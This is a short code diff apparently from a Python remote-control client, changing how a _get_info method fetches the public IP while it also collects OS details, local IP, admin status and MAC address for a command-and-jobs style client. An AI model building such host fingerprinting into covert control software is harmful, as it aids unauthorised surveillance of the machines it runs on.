@@ -147,7 +147,7 @@ class Client(object):
 
     def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
-    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
+    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [request('GET', 'http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
 
     def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
   
